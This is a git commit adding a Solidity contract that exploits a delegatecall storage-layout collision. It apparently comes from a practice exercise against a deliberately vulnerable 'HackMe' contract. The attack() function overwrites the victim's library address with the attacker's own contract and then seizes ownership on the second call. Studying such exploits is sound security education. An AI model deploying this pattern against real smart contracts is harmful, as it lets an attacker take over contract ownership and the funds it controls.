06e133434169a6ceddb391ed7c37b341dc23cd1c
RonexLemon <ronexondimu@gmail.com>
2023-04-14 12:09:56 +0300

    attack contract for wrong storage

---
+++ DelegateCall/AttackStorage.sol
@@ -0,0 +1,33 @@
+//SPDX-License-Identifier:MIT
+
+pragma solidity ^0.8.2;
+
+interface HackMe{
+    function doSomething(uint num)external;
+}
+contract Attack {
+    // Make sure the storage layout is the same as HackMe
+    // This will allow us to correctly update the state variables
+    address public lib;
+    address public owner;
+    uint public someNumber;
+
+    HackMe public hackMe;
+
+    constructor(HackMe _hackMe) {
+        hackMe = HackMe(_hackMe);
+    }
+
+    function attack() public {
+        // override address of lib
+        hackMe.doSomething(uint(uint160(address(this))));
+        // pass any number as input, the function doSomething() below will
+        // be called
+        hackMe.doSomething(1);
+    }
+
+    // function signature must match HackMe.doSomething()
+    function doSomething(uint _num) public {
+        owner = msg.sender;
+    }
+}
